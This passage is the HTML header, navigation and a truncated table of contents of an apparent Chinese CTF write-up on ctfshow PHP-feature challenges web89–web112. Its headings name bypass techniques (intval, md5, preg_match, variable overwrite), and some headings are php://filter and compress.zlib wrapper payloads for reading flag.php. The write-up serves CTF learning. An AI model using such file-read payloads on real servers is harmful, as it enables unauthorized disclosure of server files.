<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
<script>
  (function () {
    var OriginTitle = document.title;
    var titleTime;
    document.addEventListener('visibilitychange', function () {
      if (document.hidden) {
        document.title = '坏人！看完了就想走' + OriginTitle;
        clearTimeout(titleTime);
      } else {
        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
        titleTime = setTimeout(function () {
          document.title = OriginTitle;
        }, 2000);
      }
    });
  })();
</script>

    <meta name="description" content="web入门php篇-ctfshow(已做完)">
<meta property="og:type" content="article">
<meta property="og:title" content="web入门php篇-ctfshow(已做完)">
<meta property="og:url" content="https://wanth3f1ag.top/2024/11/10/web%E5%85%A5%E9%97%A8php%E7%AF%87-ctfshow(%E5%B7%B2%E5%81%9A%E5%AE%8C)/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="web入门php篇-ctfshow(已做完)">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241101204319309.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241112161937164.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241113224940047.png">
<meta property="og:image" content="https://wanth3f1ag.top/2024/11/10/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/73a60425890c8f915c96a6b17911a449.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241115145427795.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241115150015507.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118105607463-1731898571388-1.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118105850560.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118110005583.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118112218415.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118113036574.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118115336240.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118115831974.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118115858748.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118153713464.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119111431567.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119112006494.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119112031105.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119161418545.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119162822769.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119170818864.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119170916708.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119171251145.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241124135802550.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241124135840096.png">
<meta property="article:published_time" content="2024-11-10T05:31:35.000Z">
<meta property="article:modified_time" content="2025-12-01T11:07:26.379Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="php特性">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241101204319309.png">


<link rel="canonical" href="https://wanth3f1ag.top/2024/11/10/web%E5%85%A5%E9%97%A8php%E7%AF%87-ctfshow(%E5%B7%B2%E5%81%9A%E5%AE%8C)/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2024/11/10/web%E5%85%A5%E9%97%A8php%E7%AF%87-ctfshow(%E5%B7%B2%E5%81%9A%E5%AE%8C)/","path":"2024/11/10/web入门php篇-ctfshow(已做完)/","title":"web入门php篇-ctfshow(已做完)"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>web入门php篇-ctfshow(已做完) | root@wanth3f1ag</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>





  <script src="/js/third-party/pace.js" defer></script>


  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">root@wanth3f1ag</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CTFer</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">0x01基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E7%89%B9%E6%80%A7"><span class="nav-number">1.1.</span> <span class="nav-text">php特性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4%E7%9A%84%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.</span> <span class="nav-text">调用命令的常用函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02%E9%A2%98%E7%9B%AE"><span class="nav-number">2.</span> <span class="nav-text">0x02题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web89"><span class="nav-number">2.1.</span> <span class="nav-text">web89</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Epreg-match"><span class="nav-number">2.1.1.</span> <span class="nav-text">关于preg_match</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#intval-%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.2.</span> <span class="nav-text">intval()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87intval%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.3.</span> <span class="nav-text">数组绕过intval函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web90"><span class="nav-number">2.2.</span> <span class="nav-text">web90</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%BA%E6%AF%94%E8%BE%83"><span class="nav-number">2.2.1.</span> <span class="nav-text">强比较(&#x3D;&#x3D;&#x3D;)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#intval%E5%A4%84%E7%90%86%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">2.2.2.</span> <span class="nav-text">intval处理字符串</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web91"><span class="nav-number">2.3.</span> <span class="nav-text">web91</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#preg-match%E5%A4%9A%E8%A1%8C%E5%8C%B9%E9%85%8D%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="nav-number">2.3.1.</span> <span class="nav-text">preg_match多行匹配修饰符</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web92"><span class="nav-number">2.4.</span> <span class="nav-text">web92</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="nav-number">2.4.1.</span> <span class="nav-text">弱比较(&#x3D;&#x3D;)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%92%8C%E5%BC%BA%E6%AF%94%E8%BE%83%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">2.4.1.1.</span> <span class="nav-text">和强比较的区别</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Eintval-%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB"><span class="nav-number">2.4.2.</span> <span class="nav-text">关于intval()函数汇总</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#intval-%E5%87%BD%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="nav-number">2.4.2.1.</span> <span class="nav-text">intval 函数的基本语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#intval%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="nav-number">2.4.2.2.</span> <span class="nav-text">intval绕过思路</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web93"><span class="nav-number">2.5.</span> <span class="nav-text">web93</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B1%E6%AF%94%E8%BE%83%E4%B9%8B%E6%B5%AE%E7%82%B9%E6%95%B0%E5%92%8C%E6%95%B4%E6%95%B0"><span class="nav-number">2.5.1.</span> <span class="nav-text">弱比较之浮点数和整数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web94"><span class="nav-number">2.6.</span> <span class="nav-text">web94</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#strpos%E5%87%BD%E6%95%B0"><span class="nav-number">2.6.1.</span> <span class="nav-text">strpos函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web95"><span class="nav-number">2.7.</span> <span class="nav-text">web95</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web96"><span class="nav-number">3.</span> <span class="nav-text">web96</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#highlight-file-%E5%87%BD%E6%95%B0"><span class="nav-number">3.0.1.</span> <span class="nav-text">highlight_file()函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web97"><span class="nav-number">3.1.</span> <span class="nav-text">web97</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#md5%E5%93%88%E5%B8%8C%E5%80%BC"><span class="nav-number">3.1.1.</span> <span class="nav-text">md5哈希值</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%A8%E6%95%B0%E7%BB%84%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87md5%E9%AA%8C%E8%AF%81"><span class="nav-number">3.1.1.1.</span> <span class="nav-text">用数组进行绕过md5验证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#md5%E5%BC%BA%E7%A2%B0%E6%92%9E"><span class="nav-number">3.1.1.2.</span> <span class="nav-text">md5强碰撞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web98"><span class="nav-number">3.2.</span> <span class="nav-text">web98</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81if-%E8%AF%AD%E5%8F%A5%E7%AE%80%E5%86%99"><span class="nav-number">3.2.1.</span> <span class="nav-text">1、if 语句简写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%89%A7%E8%A1%8C%E5%8D%95%E6%9D%A1%E8%AF%AD%E5%8F%A5"><span class="nav-number">3.2.1.1.</span> <span class="nav-text">（1）执行单条语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="nav-number">3.2.1.2.</span> <span class="nav-text">（2）三目运算符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E7%AC%A6%E5%8F%B7"><span class="nav-number">3.2.1.3.</span> <span class="nav-text">（3）符号 || &amp;&amp;</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E9%A2%84%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F"><span class="nav-number">3.2.2.</span> <span class="nav-text">2、预定义变量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web99"><span class="nav-number">3.3.</span> <span class="nav-text">web99</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-number">3.3.1.</span> <span class="nav-text">相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#rand-%E5%87%BD%E6%95%B0"><span class="nav-number">3.3.1.1.</span> <span class="nav-text">rand()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#array-push-%E5%87%BD%E6%95%B0"><span class="nav-number">3.3.1.2.</span> <span class="nav-text">array_push()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#in-array-%E5%87%BD%E6%95%B0"><span class="nav-number">3.3.1.3.</span> <span class="nav-text">in_array() 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#file-put-contents-%E5%87%BD%E6%95%B0"><span class="nav-number">3.3.1.4.</span> <span class="nav-text">file_put_contents()函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web100"><span class="nav-number">3.4.</span> <span class="nav-text">web100</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#is-numeric-%E5%87%BD%E6%95%B0"><span class="nav-number">3.4.0.1.</span> <span class="nav-text">is_numeric()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E6%9E%81"><span class="nav-number">3.4.0.2.</span> <span class="nav-text">运算符优先极</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web101"><span class="nav-number">3.5.</span> <span class="nav-text">web101</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E7%B1%BB%E6%9F%A5%E7%9C%8B%E7%B1%BB"><span class="nav-number">3.5.1.</span> <span class="nav-text">利用反射类查看类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E7%B1%BB%EF%BC%9A-ReflectionClass"><span class="nav-number">3.5.1.1.</span> <span class="nav-text">反射类： ReflectionClass</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-number">3.5.1.1.1.</span> <span class="nav-text">常用方法</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web102"><span class="nav-number">3.6.</span> <span class="nav-text">web102</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0-1"><span class="nav-number">3.6.1.</span> <span class="nav-text">相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#substr-%E5%87%BD%E6%95%B0"><span class="nav-number">3.6.1.1.</span> <span class="nav-text">substr() 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#call-user-func-%E5%87%BD%E6%95%B0"><span class="nav-number">3.6.1.2.</span> <span class="nav-text">call_user_func()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hex2bin-%E5%87%BD%E6%95%B0"><span class="nav-number">3.6.1.3.</span> <span class="nav-text">hex2bin()函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web103"><span class="nav-number">3.7.</span> <span class="nav-text">web103</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#preg-match%E4%B8%AD-%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="nav-number">3.7.1.</span> <span class="nav-text">preg_match中*&#x2F;的作用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web104"><span class="nav-number">3.8.</span> <span class="nav-text">web104</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0-2"><span class="nav-number">3.8.1.</span> <span class="nav-text">相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sha1-%E5%87%BD%E6%95%B0"><span class="nav-number">3.8.1.1.</span> <span class="nav-text">sha1()函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web105"><span class="nav-number">3.9.</span> <span class="nav-text">web105</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0-3"><span class="nav-number">3.9.1.</span> <span class="nav-text">相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#foreach-%E5%87%BD%E6%95%B0"><span class="nav-number">3.9.1.1.</span> <span class="nav-text">foreach()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#a-b"><span class="nav-number">3.9.1.2.</span> <span class="nav-text">$$a&#x3D;$$b</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web106"><span class="nav-number">3.10.</span> <span class="nav-text">web106</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web107"><span class="nav-number">3.11.</span> <span class="nav-text">web107</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0-4"><span class="nav-number">3.11.1.</span> <span class="nav-text">相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#parse-str"><span class="nav-number">3.11.1.1.</span> <span class="nav-text">parse_str()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9A"><span class="nav-number">3.11.2.</span> <span class="nav-text">解法1：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9A"><span class="nav-number">3.11.3.</span> <span class="nav-text">解法2：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web108"><span class="nav-number">3.12.</span> <span class="nav-text">web108</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0-5"><span class="nav-number">3.12.1.</span> <span class="nav-text">相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ereg%E5%87%BD%E6%95%B0"><span class="nav-number">3.12.1.1.</span> <span class="nav-text">ereg函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#strrev-%E5%87%BD%E6%95%B0"><span class="nav-number">3.12.1.2.</span> <span class="nav-text">strrev()函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#00%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87ereg%E5%87%BD%E6%95%B0"><span class="nav-number">3.12.2.</span> <span class="nav-text">00截断绕过ereg函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web109"><span class="nav-number">3.13.</span> <span class="nav-text">web109</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web110"><span class="nav-number">3.14.</span> <span class="nav-text">web110</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Filesystemiterator%E7%B1%BB%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95"><span class="nav-number">3.14.1.</span> <span class="nav-text">Filesystemiterator类遍历目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getcwd%E5%87%BD%E6%95%B0%E8%8E%B7%E5%8F%96%E7%9B%AE%E5%BD%95"><span class="nav-number">3.14.2.</span> <span class="nav-text">getcwd函数获取目录</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web111"><span class="nav-number">3.15.</span> <span class="nav-text">web111</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval-%E2%80%9C-v1-v2-%E2%80%9D"><span class="nav-number">3.15.1.</span> <span class="nav-text">eval(“$$v1 &#x3D; &amp;$$v2;”);</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GLOBALS%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="nav-number">3.15.2.</span> <span class="nav-text">$GLOBALS超全局变量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web112"><span class="nav-number">3.16.</span> <span class="nav-text">web112</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#is-file-%E5%87%BD%E6%95%B0"><span class="nav-number">3.16.1.</span> <span class="nav-text">is_file()函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A6%81%E7%82%B9-%E5%BD%93is-file%E7%9A%84%E5%8F%82%E6%95%B0%E4%B8%BA%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%97%B6%EF%BC%8C%E8%BF%94%E5%9B%9E%E5%80%BC%E4%B8%BAfalse"><span class="nav-number">3.16.1.1.</span> <span class="nav-text">要点:当is_file的参数为伪协议时，返回值为false</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-%E7%9B%B4%E6%8E%A5%E7%94%A8%E5%8C%85%E8%A3%85%E5%99%A8%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.16.2.</span> <span class="nav-text">解法一:直接用包装器伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#filter%E5%8C%85%E8%A3%85%E5%99%A8"><span class="nav-number">3.16.2.1.</span> <span class="nav-text">filter包装器</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D-%E8%A7%A3%E6%B3%95%E4%BA%8C-%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8%E8%BF%9B%E8%A1%8C%E8%BD%AC%E6%8D%A2"><span class="nav-number">3.16.3.</span> <span class="nav-text">(重)解法二:用过滤器进行转换</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php-filter-read-convert-quoted-printable-encode-resource-flag-php"><span class="nav-number">3.16.3.1.</span> <span class="nav-text">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#compress-zlib-flag-php"><span class="nav-number">3.16.3.2.</span> <span class="nav-text">compress.zlib:&#x2F;&#x2F;flag.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-filter-convert-iconv-UCS-2LE-UCS-2BE-resource-flag-php"><span class="nav-number">3.16.3.3.</span> <span 